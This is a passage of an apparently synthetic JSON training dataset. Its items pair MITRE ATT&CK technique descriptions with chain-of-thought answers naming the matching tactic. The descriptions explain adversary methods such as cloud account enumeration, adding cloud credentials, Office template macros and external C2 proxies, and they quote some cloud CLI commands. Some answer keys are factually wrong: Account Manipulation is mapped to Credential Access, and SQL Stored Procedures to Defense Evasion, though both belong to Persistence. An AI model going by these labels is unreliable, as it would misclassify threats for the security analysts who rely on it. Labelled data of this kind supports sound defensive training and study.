      "question": "Which tactic is related to the following description - Adversaries may purchase technical information about victims that can be used during targeting. Information about victims may be available for purchase within reputable private sources and databases, such as paid subscriptions to feeds of scan databases or other data aggregation services. Adversaries may also purchase information from less-reputable sources such as dark web or cybercrime blackmarkets.\n\nAdversaries may purchase information about their already identified targets, or use purchased data to discover opportunities for successful breaches. Threat actors may gather various technical details from purchased data, including but not limited to employee contact information, credentials, or specifics regarding a victim\u2019s infrastructure. Information from these sources may reveal opportunities for other forms of reconnaissance (ex: Phishing for Information or Search Open Websites/Domains), establishing operational resources (ex: Develop Capabilities or Obtain Capabilities), and/or initial access (ex: External Remote Services or Valid Accounts).",
      "answer": "The given description is related to sub technique Purchase Technical Data (T1597.002);\nSub technique Purchase Technical Data (T1597.002) is a type of technique Search Closed Sources (T1597);\nTechnique Search Closed Sources (T1597) is a type of tactic Reconnaissance (TA0043);\nTherefore, the given description is related to tactic Reconnaissance (TA0043).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description - Adversaries may attempt to get a listing of cloud accounts. Cloud accounts are those created and configured by an organization for use by users, remote support, services, or for administration of resources within a cloud service provider or SaaS application.\n\nWith authenticated access there are several tools that can be used to find accounts. The <code>Get-MsolRoleMember</code> PowerShell cmdlet can be used to obtain account names given a role or permissions group in Office 365. The Azure CLI (AZ CLI) also provides an interface to obtain user accounts with authenticated access to a domain. The command <code>az ad user list</code> will list all users within a domain. \n\nThe AWS command <code>aws iam list-users</code> may be used to obtain a list of users in the current account while <code>aws iam list-roles</code> can obtain IAM roles that have a specified path prefix. In GCP, <code>gcloud iam service-accounts list</code> and <code>gcloud projects get-iam-policy</code> may be used to obtain a listing of service accounts and users in a project.",
    "context": "",
    "output": "The given description is related to sub technique Cloud Account (T1087.004);\nSub technique Cloud Account (T1087.004) is a type of technique Account Discovery (T1087);\nTechnique Account Discovery (T1087) is a type of tactic Discovery (TA0007);\nTherefore, the given description is related to tactic Discovery (TA0007).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description - Adversaries may attempt to get a listing of cloud accounts. Cloud accounts are those created and configured by an organization for use by users, remote support, services, or for administration of resources within a cloud service provider or SaaS application.\n\nWith authenticated access there are several tools that can be used to find accounts. The <code>Get-MsolRoleMember</code> PowerShell cmdlet can be used to obtain account names given a role or permissions group in Office 365. The Azure CLI (AZ CLI) also provides an interface to obtain user accounts with authenticated access to a domain. The command <code>az ad user list</code> will list all users within a domain. \n\nThe AWS command <code>aws iam list-users</code> may be used to obtain a list of users in the current account while <code>aws iam list-roles</code> can obtain IAM roles that have a specified path prefix. In GCP, <code>gcloud iam service-accounts list</code> and <code>gcloud projects get-iam-policy</code> may be used to obtain a listing of service accounts and users in a project.",
      "answer": "The given description is related to sub technique Cloud Account (T1087.004);\nSub technique Cloud Account (T1087.004) is a type of technique Account Discovery (T1087);\nTechnique Account Discovery (T1087) is a type of tactic Discovery (TA0007);\nTherefore, the given description is related to tactic Discovery (TA0007).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description:\nAdversaries may modify component firmware to persist on systems. Some adversaries may employ sophisticated means to compromise computer components and install malicious firmware that will execute adversary code outside of the operating system and main system firmware or BIOS. This technique may be similar to System Firmware but conducted upon other system components/devices that may not have the same capability or level of integrity checking.\n\nMalicious component firmware could provide both a persistent level of access to systems despite potential typical failures to maintain access and hard disk re-images, as well as a way to evade host software-based defenses and integrity checks.",
    "context": "",
    "output": "The given description is related to sub technique: Component Firmware (T1542.002);\nSub technique Component Firmware (T1542.002) is a type of technique Pre-OS Boot (T1542);\nTechnique Pre-OS Boot (T1542) is a type of tactic Defense Evasion (TA0005);\nTherefore, the given description is related to tactic Defense Evasion (TA0005).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description:\nAdversaries may modify component firmware to persist on systems. Some adversaries may employ sophisticated means to compromise computer components and install malicious firmware that will execute adversary code outside of the operating system and main system firmware or BIOS. This technique may be similar to System Firmware but conducted upon other system components/devices that may not have the same capability or level of integrity checking.\n\nMalicious component firmware could provide both a persistent level of access to systems despite potential typical failures to maintain access and hard disk re-images, as well as a way to evade host software-based defenses and integrity checks.",
      "answer": "The given description is related to sub technique: Component Firmware (T1542.002);\nSub technique Component Firmware (T1542.002) is a type of technique Pre-OS Boot (T1542);\nTechnique Pre-OS Boot (T1542) is a type of tactic Defense Evasion (TA0005);\nTherefore, the given description is related to tactic Defense Evasion (TA0005).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description - Adversaries may disable or modify a firewall within a cloud environment to bypass controls that limit access to cloud resources. Cloud firewalls are separate from system firewalls that are described in Disable or Modify System Firewall. \n\nCloud environments typically utilize restrictive security groups and firewall rules that only allow network activity from trusted IP addresses via expected ports and protocols. An adversary may introduce new firewall rules or policies to allow access into a victim cloud environment. For example, an adversary may use a script or utility that creates new ingress rules in existing security groups to allow any TCP/IP connectivity, or remove networking limitations to support traffic associated with malicious activity (such as cryptomining).\n\nModifying or disabling a cloud firewall may enable adversary C2 communications, lateral movement, and/or data exfiltration that would otherwise not be allowed.?",
    "context": "",
    "output": "The given description is related to sub technique Disable or Modify Cloud Firewall (T1562.007);\nSub technique Disable or Modify Cloud Firewall (T1562.007) is a type of technique Impair Defenses (T1562);\nTechnique Impair Defenses (T1562) is a type of tactic Defense Evasion (TA0005);\nTherefore, the given description is related to tactic Defense Evasion (TA0005).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description - Adversaries may disable or modify a firewall within a cloud environment to bypass controls that limit access to cloud resources. Cloud firewalls are separate from system firewalls that are described in Disable or Modify System Firewall. \n\nCloud environments typically utilize restrictive security groups and firewall rules that only allow network activity from trusted IP addresses via expected ports and protocols. An adversary may introduce new firewall rules or policies to allow access into a victim cloud environment. For example, an adversary may use a script or utility that creates new ingress rules in existing security groups to allow any TCP/IP connectivity, or remove networking limitations to support traffic associated with malicious activity (such as cryptomining).\n\nModifying or disabling a cloud firewall may enable adversary C2 communications, lateral movement, and/or data exfiltration that would otherwise not be allowed.",
      "answer": "The given description is related to sub technique Disable or Modify Cloud Firewall (T1562.007);\nSub technique Disable or Modify Cloud Firewall (T1562.007) is a type of technique Impair Defenses (T1562);\nTechnique Impair Defenses (T1562) is a type of tactic Defense Evasion (TA0005);\nTherefore, the given description is related to tactic Defense Evasion (TA0005).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description - Adversaries may stage collected data in a central location or directory on the local system prior to Exfiltration. Data may be kept in separate files or combined into one file through techniques such as Archive Collected Data. Interactive command shells may be used, and common functionality within cmd and bash may be used to copy data into a staging location.\n\nAdversaries may also stage collected data in various available formats/locations of a system, including local storage databases/repositories or the Windows Registry.",
    "context": "",
    "output": "The given description is related to sub technique Local Data Staging (T1074.001);\nSub technique Local Data Staging (T1074.001) is a type of technique Data Staged (T1074);\nTechnique Data Staged (T1074) is a type of tactic Collection (TA0009);\nTherefore, the given description is related to tactic Collection (TA0009).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description - Adversaries may stage collected data in a central location or directory on the local system prior to Exfiltration. Data may be kept in separate files or combined into one file through techniques such as Archive Collected Data. Interactive command shells may be used, and common functionality within cmd and bash may be used to copy data into a staging location.\n\nAdversaries may also stage collected data in various available formats/locations of a system, including local storage databases/repositories or the Windows Registry.",
      "answer": "The given description is related to sub technique Local Data Staging (T1074.001);\nSub technique Local Data Staging (T1074.001) is a type of technique Data Staged (T1074);\nTechnique Data Staged (T1074) is a type of tactic Collection (TA0009);\nTherefore, the given description is related to tactic Collection (TA0009).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description - Adversaries may abuse Microsoft Outlook rules to obtain persistence on a compromised system. Outlook rules allow a user to define automated behavior to manage email messages. A benign rule might, for example, automatically move an email to a particular folder in Outlook if it contains specific words from a specific sender. Malicious Outlook rules can be created that can trigger code execution when an adversary sends a specifically crafted email to that user.\n\nOnce malicious rules have been added to the user\u2019s mailbox, they will be loaded when Outlook is started. Malicious rules will execute when an adversary sends a specifically crafted email to the user.",
    "context": "",
    "output": "The given description is related to sub technique Outlook Rules (T1137.005);\nSub technique Outlook Rules (T1137.005) is a type of technique Office Application Startup (T1137);\nTechnique Office Application Startup (T1137) is a type of tactic Persistence (TA0003);\nTherefore, the given description is related to tactic Persistence (TA0003).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description - Adversaries may abuse Microsoft Outlook rules to obtain persistence on a compromised system. Outlook rules allow a user to define automated behavior to manage email messages. A benign rule might, for example, automatically move an email to a particular folder in Outlook if it contains specific words from a specific sender. Malicious Outlook rules can be created that can trigger code execution when an adversary sends a specifically crafted email to that user.\n\nOnce malicious rules have been added to the user\u2019s mailbox, they will be loaded when Outlook is started. Malicious rules will execute when an adversary sends a specifically crafted email to the user.",
      "answer": "The given description is related to sub technique Outlook Rules (T1137.005);\nSub technique Outlook Rules (T1137.005) is a type of technique Office Application Startup (T1137);\nTechnique Office Application Startup (T1137) is a type of tactic Persistence (TA0003);\nTherefore, the given description is related to tactic Persistence (TA0003).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description:\nAdversaries may add adversary-controlled credentials to a cloud account to maintain persistent access to victim accounts and instances within the environment.\n\nFor example, adversaries may add credentials for Service Principals and Applications in addition to existing legitimate credentials in Azure AD. These credentials include both x509 keys and passwords. With sufficient permissions, there are a variety of ways to add credentials including the Azure Portal, Azure command line interface, and Azure or Az PowerShell modules.\n\nIn infrastructure-as-a-service (IaaS) environments, after gaining access through Cloud Accounts, adversaries may generate or import their own SSH keys using either the <code>CreateKeyPair</code> or <code>ImportKeyPair</code> API in AWS or the <code>gcloud compute os-login ssh-keys add</code> command in GCP. This allows persistent access to instances within the cloud environment without further usage of the compromised cloud accounts.\n\nAdversaries may also use the <code>CreateAccessKey</code> API in AWS or the <code>gcloud iam service-accounts keys create</code> command in GCP to add access keys to an account. If the target account has different permissions from the requesting account, the adversary may also be able to escalate their privileges in the environment (i.e. Cloud Accounts). For example, in Azure AD environments, an adversary with the Application Administrator role can add a new set of credentials to their application's service principal. In doing so the adversary would be able to access the service principal\u2019s roles and permissions, which may be different from those of the Application Administrator. \n\nIn AWS environments, adversaries with the appropriate permissions may also use the `sts:GetFederationToken` API call to create a temporary set of credentials to Forge Web Credentials tied to the permissions of the original user account. These temporary credentials may remain valid for the duration of their lifetime even if the original account\u2019s API credentials are deactivated.?",
    "context": "",
    "output": "The given description is related to sub technique: Additional Cloud Credentials (T1098.001);\nSub technique Additional Cloud Credentials (T1098.001) is a type of technique Account Manipulation (T1098);\nTechnique Account Manipulation (T1098) is a type of tactic Credential Access (TA0006);\nTherefore, the given description is related to tactic Credential Access (TA0006).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description:\nAdversaries may add adversary-controlled credentials to a cloud account to maintain persistent access to victim accounts and instances within the environment.\n\nFor example, adversaries may add credentials for Service Principals and Applications in addition to existing legitimate credentials in Azure AD. These credentials include both x509 keys and passwords. With sufficient permissions, there are a variety of ways to add credentials including the Azure Portal, Azure command line interface, and Azure or Az PowerShell modules.\n\nIn infrastructure-as-a-service (IaaS) environments, after gaining access through Cloud Accounts, adversaries may generate or import their own SSH keys using either the <code>CreateKeyPair</code> or <code>ImportKeyPair</code> API in AWS or the <code>gcloud compute os-login ssh-keys add</code> command in GCP. This allows persistent access to instances within the cloud environment without further usage of the compromised cloud accounts.\n\nAdversaries may also use the <code>CreateAccessKey</code> API in AWS or the <code>gcloud iam service-accounts keys create</code> command in GCP to add access keys to an account. If the target account has different permissions from the requesting account, the adversary may also be able to escalate their privileges in the environment (i.e. Cloud Accounts). For example, in Azure AD environments, an adversary with the Application Administrator role can add a new set of credentials to their application's service principal. In doing so the adversary would be able to access the service principal\u2019s roles and permissions, which may be different from those of the Application Administrator. \n\nIn AWS environments, adversaries with the appropriate permissions may also use the `sts:GetFederationToken` API call to create a temporary set of credentials to Forge Web Credentials tied to the permissions of the original user account. These temporary credentials may remain valid for the duration of their lifetime even if the original account\u2019s API credentials are deactivated.",
      "answer": "The given description is related to sub technique: Additional Cloud Credentials (T1098.001);\nSub technique Additional Cloud Credentials (T1098.001) is a type of technique Account Manipulation (T1098);\nTechnique Account Manipulation (T1098) is a type of tactic Credential Access (TA0006);\nTherefore, the given description is related to tactic Credential Access (TA0006).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description - Adversaries may abuse Microsoft Office templates to obtain persistence on a compromised system. Microsoft Office contains templates that are part of common Office applications and are used to customize styles. The base templates within the application are used each time an application starts. \n\nOffice Visual Basic for Applications (VBA) macros  can be inserted into the base template and used to execute code when the respective Office application starts in order to obtain persistence. Examples for both Word and Excel have been discovered and published. By default, Word has a Normal.dotm template created that can be modified to include a malicious macro. Excel does not have a template file created by default, but one can be added that will automatically be loaded. Shared templates may also be stored and pulled from remote locations. \n\nWord Normal.dotm location:<br>\n<code>C:\\Users\\&lt;username&gt;\\AppData\\Roaming\\Microsoft\\Templates\\Normal.dotm</code>\n\nExcel Personal.xlsb location:<br>\n<code>C:\\Users\\&lt;username&gt;\\AppData\\Roaming\\Microsoft\\Excel\\XLSTART\\PERSONAL.XLSB</code>\n\nAdversaries may also change the location of the base template to point to their own by hijacking the application's search order, e.g. Word 2016 will first look for Normal.dotm under <code>C:\\Program Files (x86)\\Microsoft Office\\root\\Office16\\</code>, or by modifying the GlobalDotName registry key. By modifying the GlobalDotName registry key an adversary can specify an arbitrary location, file name, and file extension to use for the template that will be loaded on application startup. To abuse GlobalDotName, adversaries may first need to register the template as a trusted document or place it in a trusted location. \n\nAn adversary may need to enable macros to execute unrestricted depending on the system or enterprise security policy on use of macros.",
    "context": "",
    "output": "The given description is related to sub technique Office Template Macros (T1137.001);\nSub technique Office Template Macros (T1137.001) is a type of technique Office Application Startup (T1137);\nTechnique Office Application Startup (T1137) is a type of tactic Persistence (TA0003);\nTherefore, the given description is related to tactic Persistence (TA0003).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description - Adversaries may abuse Microsoft Office templates to obtain persistence on a compromised system. Microsoft Office contains templates that are part of common Office applications and are used to customize styles. The base templates within the application are used each time an application starts. \n\nOffice Visual Basic for Applications (VBA) macros  can be inserted into the base template and used to execute code when the respective Office application starts in order to obtain persistence. Examples for both Word and Excel have been discovered and published. By default, Word has a Normal.dotm template created that can be modified to include a malicious macro. Excel does not have a template file created by default, but one can be added that will automatically be loaded. Shared templates may also be stored and pulled from remote locations. \n\nWord Normal.dotm location:<br>\n<code>C:\\Users\\&lt;username&gt;\\AppData\\Roaming\\Microsoft\\Templates\\Normal.dotm</code>\n\nExcel Personal.xlsb location:<br>\n<code>C:\\Users\\&lt;username&gt;\\AppData\\Roaming\\Microsoft\\Excel\\XLSTART\\PERSONAL.XLSB</code>\n\nAdversaries may also change the location of the base template to point to their own by hijacking the application's search order, e.g. Word 2016 will first look for Normal.dotm under <code>C:\\Program Files (x86)\\Microsoft Office\\root\\Office16\\</code>, or by modifying the GlobalDotName registry key. By modifying the GlobalDotName registry key an adversary can specify an arbitrary location, file name, and file extension to use for the template that will be loaded on application startup. To abuse GlobalDotName, adversaries may first need to register the template as a trusted document or place it in a trusted location. \n\nAn adversary may need to enable macros to execute unrestricted depending on the system or enterprise security policy on use of macros.",
      "answer": "The given description is related to sub technique Office Template Macros (T1137.001);\nSub technique Office Template Macros (T1137.001) is a type of technique Office Application Startup (T1137);\nTechnique Office Application Startup (T1137) is a type of tactic Persistence (TA0003);\nTherefore, the given description is related to tactic Persistence (TA0003).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description:\nAdversaries may use Valid Accounts to interact with remote systems using Windows Remote Management (WinRM). The adversary may then perform actions as the logged-on user.\n\nWinRM is the name of both a Windows service and a protocol that allows a user to interact with a remote system (e.g., run an executable, modify the Registry, modify services). It may be called with the `winrm` command or by any number of programs such as PowerShell. WinRM  can be used as a method of remotely interacting with Windows Management Instrumentation.?",
    "context": "",
    "output": "The given description is related to sub technique: Windows Remote Management (T1021.006);\nSub technique Windows Remote Management (T1021.006) is a type of technique Remote Services (T1021);\nTechnique Remote Services (T1021) is a type of tactic Lateral Movement (TA0008);\nTherefore, the given description is related to tactic Lateral Movement (TA0008).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description:\nAdversaries may use Valid Accounts to interact with remote systems using Windows Remote Management (WinRM). The adversary may then perform actions as the logged-on user.\n\nWinRM is the name of both a Windows service and a protocol that allows a user to interact with a remote system (e.g., run an executable, modify the Registry, modify services). It may be called with the `winrm` command or by any number of programs such as PowerShell. WinRM  can be used as a method of remotely interacting with Windows Management Instrumentation.",
      "answer": "The given description is related to sub technique: Windows Remote Management (T1021.006);\nSub technique Windows Remote Management (T1021.006) is a type of technique Remote Services (T1021);\nTechnique Remote Services (T1021) is a type of tactic Lateral Movement (TA0008);\nTherefore, the given description is related to tactic Lateral Movement (TA0008).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description:\nAdversaries may attempt to make payloads difficult to discover and analyze by delivering files to victims as uncompiled code. Text-based source code files may subvert analysis and scrutiny from protections targeting executables/binaries. These payloads will need to be compiled before execution; typically via native utilities such as csc.exe or GCC/MinGW.\n\nSource code payloads may also be encrypted, encoded, and/or embedded within other files, such as those delivered as a Phishing. Payloads may also be delivered in formats unrecognizable and inherently benign to the native OS (ex: EXEs on macOS/Linux) before later being (re)compiled into a proper executable binary with a bundled compiler and execution framework.?",
    "context": "",
    "output": "The given description is related to sub technique: Compile After Delivery (T1027.004);\nSub technique Compile After Delivery (T1027.004) is a type of technique Obfuscated Files or Information (T1027);\nTechnique Obfuscated Files or Information (T1027) is a type of tactic Defense Evasion (TA0005);\nTherefore, the given description is related to tactic Defense Evasion (TA0005).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description:\nAdversaries may attempt to make payloads difficult to discover and analyze by delivering files to victims as uncompiled code. Text-based source code files may subvert analysis and scrutiny from protections targeting executables/binaries. These payloads will need to be compiled before execution; typically via native utilities such as csc.exe or GCC/MinGW.\n\nSource code payloads may also be encrypted, encoded, and/or embedded within other files, such as those delivered as a Phishing. Payloads may also be delivered in formats unrecognizable and inherently benign to the native OS (ex: EXEs on macOS/Linux) before later being (re)compiled into a proper executable binary with a bundled compiler and execution framework.",
      "answer": "The given description is related to sub technique: Compile After Delivery (T1027.004);\nSub technique Compile After Delivery (T1027.004) is a type of technique Obfuscated Files or Information (T1027);\nTechnique Obfuscated Files or Information (T1027) is a type of tactic Defense Evasion (TA0005);\nTherefore, the given description is related to tactic Defense Evasion (TA0005).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description - Adversaries may use an external proxy to act as an intermediary for network communications to a command and control server to avoid direct connections to their infrastructure. Many tools exist that enable traffic redirection through proxies or port redirection, including HTRAN, ZXProxy, and ZXPortMap.  Adversaries use these types of proxies to manage command and control communications, to provide resiliency in the face of connection loss, or to ride over existing trusted communications paths to avoid suspicion.\n\nExternal connection proxies are used to mask the destination of C2 traffic and are typically implemented with port redirectors. Compromised systems outside of the victim environment may be used for these purposes, as well as purchased infrastructure such as cloud-based resources or virtual private servers. Proxies may be chosen based on the low likelihood that a connection to them from a compromised system would be investigated. Victim systems would communicate directly with the external proxy on the Internet and then the proxy would forward communications to the C2 server.",
    "context": "",
    "output": "The given description is related to sub technique External Proxy (T1090.002);\nSub technique External Proxy (T1090.002) is a type of technique Proxy (T1090);\nTechnique Proxy (T1090) is a type of tactic Command and Control (TA0011);\nTherefore, the given description is related to tactic Command and Control (TA0011).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description - Adversaries may use an external proxy to act as an intermediary for network communications to a command and control server to avoid direct connections to their infrastructure. Many tools exist that enable traffic redirection through proxies or port redirection, including HTRAN, ZXProxy, and ZXPortMap.  Adversaries use these types of proxies to manage command and control communications, to provide resiliency in the face of connection loss, or to ride over existing trusted communications paths to avoid suspicion.\n\nExternal connection proxies are used to mask the destination of C2 traffic and are typically implemented with port redirectors. Compromised systems outside of the victim environment may be used for these purposes, as well as purchased infrastructure such as cloud-based resources or virtual private servers. Proxies may be chosen based on the low likelihood that a connection to them from a compromised system would be investigated. Victim systems would communicate directly with the external proxy on the Internet and then the proxy would forward communications to the C2 server.",
      "answer": "The given description is related to sub technique External Proxy (T1090.002);\nSub technique External Proxy (T1090.002) is a type of technique Proxy (T1090);\nTechnique Proxy (T1090) is a type of tactic Command and Control (TA0011);\nTherefore, the given description is related to tactic Command and Control (TA0011).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description - Adversaries may abuse SQL stored procedures to establish persistent access to systems. SQL Stored Procedures are code that can be saved and reused so that database users do not waste time rewriting frequently used SQL queries. Stored procedures can be invoked via SQL statements to the database using the procedure name or via defined events (e.g. when a SQL server application is started/restarted).\n\nAdversaries may craft malicious stored procedures that can provide a persistence mechanism in SQL database servers. To execute operating system commands through SQL syntax the adversary may have to enable additional functionality, such as xp_cmdshell for MSSQL Server. \n\nMicrosoft SQL Server can enable common language runtime (CLR) integration. With CLR integration enabled, application developers can write stored procedures using any .NET framework language (e.g. VB .NET, C#, etc.). Adversaries may craft or modify CLR assemblies that are linked to stored procedures since these CLR assemblies can be made to execute arbitrary commands.",
    "context": "",
    "output": "The given description is related to sub technique SQL Stored Procedures (T1505.001);\nSub technique SQL Stored Procedures (T1505.001) is a type of technique Server Software Component (T1505);\nTechnique Server Software Component (T1505) is a type of tactic Defense Evasion (TA0005);\nTherefore, the given description is related to tactic Defense Evasion (TA0005).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description - Adversaries may abuse SQL stored procedures to establish persistent access to systems. SQL Stored Procedures are code that can be saved and reused so that database users do not waste time rewriting frequently used SQL queries. Stored procedures can be invoked via SQL statements to the database using the procedure name or via defined events (e.g. when a SQL server application is started/restarted).\n\nAdversaries may craft malicious stored procedures that can provide a persistence mechanism in SQL database servers. To execute operating system commands through SQL syntax the adversary may have to enable additional functionality, such as xp_cmdshell for MSSQL Server. \n\nMicrosoft SQL Server can enable common language runtime (CLR) integration. With CLR integration enabled, application developers can write stored procedures using any .NET framework language (e.g. VB .NET, C#, etc.). Adversaries may craft or modify CLR assemblies that are linked to stored procedures since these CLR assemblies can be made to execute arbitrary commands.",
      "answer": "The given description is related to sub technique SQL Stored Procedures (T1505.001);\nSub technique SQL Stored Procedures (T1505.001) is a type of technique Server Software Component (T1505);\nTechnique Server Software Component (T1505) is a type of tactic Defense Evasion (TA0005);\nTherefore, the given description is related to tactic Defense Evasion (TA0005).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description - Adversaries may use Patch System Image to hard code a password in the operating system, thus bypassing of native authentication mechanisms for local accounts on network devices.\n\nModify System Image may include implanted code to the operating system for network devices to provide access for adversaries using a specific password.  The modification includes a specific password which is implanted in the operating system image via the patch.  Upon authentication attempts, the inserted code will first check to see if the user input is the password. If so, access is granted. Otherwise, the implanted code will pass the credentials on for verification of potentially valid credentials.?",
    "context": "",
    "output": "The given description is related to sub technique Network Device Authentication (T1556.004);\nSub technique Network Device Authentication (T1556.004) is a type of technique Modify Authentication Process (T1556);\nTechnique Modify Authentication Process (T1556) is a type of tactic Defense Evasion (TA0005);\nTherefore, the given description is related to tactic Defense Evasion (TA0005).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description - Adversaries may use Patch System Image to hard code a password in the operating system, thus bypassing of native authentication mechanisms for local accounts on network devices.\n\nModify System Image may include implanted code to the operating system for network devices to provide access for adversaries using a specific password.  The modification includes a specific password which is implanted in the operating system image via the patch.  Upon authentication attempts, the inserted code will first check to see if the user input is the password. If so, access is granted. Otherwise, the implanted code will pass the credentials on for verification of potentially valid credentials.",
      "answer": "The given description is related to sub technique Network Device Authentication (T1556.004);\nSub technique Network Device Authentication (T1556.004) is a type of technique Modify Authentication Process (T1556);\nTechnique Modify Authentication Process (T1556) is a type of tactic Defense Evasion (TA0005);\nTherefore, the given description is related to tactic Defense Evasion (TA0005).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description:\nAdversaries may search content delivery network (CDN) data about victims that can be used during targeting. CDNs allow an organization to host content from a distributed, load balanced array of servers. CDNs may also allow organizations to customize content delivery based on the requestor\u2019s geographical region.\n\nAdversaries may search CDN data to gather actionable information. Threat actors can use online resources and lookup tools to harvest information about content servers within a CDN. Adversaries may also seek and target CDN misconfigurations that leak sensitive information not intended to be hosted and/or do not have the same protection mechanisms (ex: login portals) as the content hosted on the organization\u2019s website. Information from these sources may reveal opportunities for other forms of reconnaissance (ex: Active Scanning or Search Open Websites/Domains), establishing operational resources (ex: Acquire Infrastructure or Compromise Infrastructure), and/or initial access (ex: Drive-by Compromise).",
    "context": "",
    "output": "The given description is related to sub technique: CDNs (T1596.004);\nSub technique CDNs (T1596.004) is a type of technique Search Open Technical Databases (T1596);\nTechnique Search Open Technical Databases (T1596) is a type of tactic Reconnaissance (TA0043);\nTherefore, the given description is related to tactic Reconnaissance (TA0043).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description:\nAdversaries may search content delivery network (CDN) data about victims that can be used during targeting. CDNs allow an organization to host content from a distributed, load balanced array of servers. CDNs may also allow organizations to customize content delivery based on the requestor\u2019s geographical region.\n\nAdversaries may search CDN data to gather actionable information. Threat actors can use online resources and lookup tools to harvest information about content servers within a CDN. Adversaries may also seek and target CDN misconfigurations that leak sensitive information not intended to be hosted and/or do not have the same protection mechanisms (ex: login portals) as the content hosted on the organization\u2019s website. Information from these sources may reveal opportunities for other forms of reconnaissance (ex: Active Scanning or Search Open Websites/Domains), establishing operational resources (ex: Acquire Infrastructure or Compromise Infrastructure), and/or initial access (ex: Drive-by Compromise).",
      "answer": "The given description is related to sub technique: CDNs (T1596.004);\nSub technique CDNs (T1596.004) is a type of technique Search Open Technical Databases (T1596);\nTechnique Search Open Technical Databases (T1596) is a type of tactic Reconnaissance (TA0043);\nTherefore, the given description is related to tactic Reconnaissance (TA0043).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description:\nAn adversary may rely upon a user opening a malicious file in order to gain execution. Users may be subjected to social engineering to get them to open a file that will lead to code execution. This user action will typically be observed as follow-on behavior from Spearphishing Attachment. Adversaries may use several types of files that require a user to execute them, including .doc, .pdf, .xls, .rtf, .scr, .exe, .lnk, .pif, and .cpl.\n\nAdversaries may employ various forms of Masquerading and Obfuscated Files or Information to increase the likelihood that a user will open and successfully execute a malicious file. These methods may include using a familiar naming convention and/or password protecting the file and supplying instructions to a user on how to open it. \n\nWhile Malicious File frequently occurs shortly after Initial Access it may occur at other phases of an intrusion, such as when an adversary places a file in a shared directory or on a user's desktop hoping that a user will click on it. This activity may also be seen shortly after Internal Spearphishing.?",
    "context": "",
    "output": "The given description is related to sub technique: Malicious File (T1204.002);\nSub technique Malicious File (T1204.002) is a type of technique User Execution (T1204);\nTechnique User Execution (T1204) is a type of tactic Execution (TA0002);\nTherefore, the given description is related to tactic Execution (TA0002).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
